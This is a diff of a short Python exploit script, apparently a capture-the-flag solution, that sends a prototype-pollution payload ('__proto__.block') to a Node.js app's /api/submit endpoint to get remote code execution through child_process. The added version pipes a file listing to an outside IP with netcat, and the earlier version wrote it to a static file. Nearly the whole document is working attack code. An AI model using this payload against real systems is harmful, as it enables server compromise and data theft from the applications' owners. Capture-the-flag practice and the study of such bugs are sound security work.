@@ -1,6 +1,8 @@
-import requests
+import requests,html
 
-host = "http://188.166.174.107:30392"
+# excerpt from https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
+
+host = "http://167.99.89.198:31971"
 # r = requests.post(host+"/api/submit", json={
 #     "artist.name": "Haigh",
 #     "__proto__": {
@@ -8,20 +10,20 @@ host = "http://188.166.174.107:30392"
 #         "console.log(\"penetrated\")": "test"}
 #         })
 
+# RCE using javascript prototype pollution
+command = "ls * | nc 20.124.113.160 3000"
 r = requests.post(host + '/api/submit', json = {
-    "artist.name":"Haigh",
-    "__proto__.block": {
-        "type": "Text", 
-        "line": "const { exec } = require(\'child_process\'); exec(`ls > /app/static/output`);"
+    'artist.name':'Haigh',
+    '__proto__.block': {
+        'type': 'Text', 
+        'line': f'console.log(process.mainModule.require("child_process").execSync("{command}").toString())'
     },
-    "loc": {
-        "start": 0,
-        "end": 0
+    'loc': {
+        'start': 0,
+        'end': 0
     }
 })
-answer = r.text
+answer = html.unescape(r.text)
 
-print(answer+"\n")
+print(answer)
 print(r.raw)
-
-print(requests.get(host+"/static/output").text)
